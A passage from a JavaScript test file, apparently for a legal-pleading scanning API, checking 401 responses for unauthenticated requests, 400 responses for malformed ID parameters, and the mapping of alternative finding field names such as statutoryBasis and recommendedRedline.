    assert.equal((await simulateDeleteScan(null, 1)).status, 401);
    assert.equal((await simulateListDrafts(null)).status, 401);
    assert.equal((await simulateGetDraft(null, 1)).status, 401);
    assert.equal((await simulatePostDraft(null, { title: "T", content: "C" })).status, 401);
    assert.equal((await simulatePatchDraft(null, 1, { title: "T" })).status, 401);
    assert.equal((await simulateDeleteDraft(null, 1)).status, 401);
    assert.equal((await simulateDeleteSearchHistory(null, 1)).status, 401);
    assert.equal((await simulateClearSearchHistory(null)).status, 401);
    assert.equal((await simulateGetOrgActivity(null, 999)).status, 401);
    assert.equal((await simulatePostOrgActivity(null, 999, { action: "A" })).status, 401);
  });

  it("returns 400 Bad Request when ID parameter is non-numeric or malformed", async () => {
    const invalidIds = ["abc", "undefined", "null", "NaN", "{}"];
    for (const invalidId of invalidIds) {
      assert.equal((await simulateGetScan("user_alice", invalidId)).status, 400);
      assert.equal((await simulateDeleteScan("user_alice", invalidId)).status, 400);
      assert.equal((await simulateGetDraft("user_alice", invalidId)).status, 400);
      assert.equal((await simulatePatchDraft("user_alice", invalidId, { title: "T" })).status, 400);
      assert.equal((await simulateDeleteDraft("user_alice", invalidId)).status, 400);
      assert.equal((await simulateDeleteSearchHistory("user_alice", invalidId)).status, 400);
      assert.equal((await simulateGetOrgActivity("user_alice", invalidId)).status, 400);
      assert.equal((await simulatePostOrgActivity("user_alice", invalidId, { action: "A" })).status, 400);
    }
  });

  it("handles alternative finding field names (statutoryBasis, recommendedRedline, originalSnippet, accepted) gracefully without crashing", async () => {
    const res = await simulatePostScan("user_alice", {
      title: "Pleading Scan with Alternative Field Names",
      text: "Civil Suit plaint text",
      findings: [
        {
          pillar: "Civil Procedure",
          category: "Order 6 CPC",
          severity: "warning",
          title: "Alternative issue title field",
          statutoryBasis: "CPC 1908 O.6 R.15",
          recommendedRedline: "Add verification on oath",
          originalSnippet: "Verification: Verified at Lahore",
          accepted: true,
        },
      ],
    });

    assert.equal(res.status, 201);
    assert.equal(res.body.findings.length, 1);
    const finding = res.body.findings[0];
    assert.equal(finding.issue, "Alternative issue title field");
    assert.equal(finding.statuteRef, "CPC 1908 O.6 R.15");
    assert.equal(finding.recommendation, "Add verification on oath");
    assert.equal(finding.rawSnippet, "Verification: Verified at Lahore");
    assert.equal(finding.isResolved, true);
  });
});
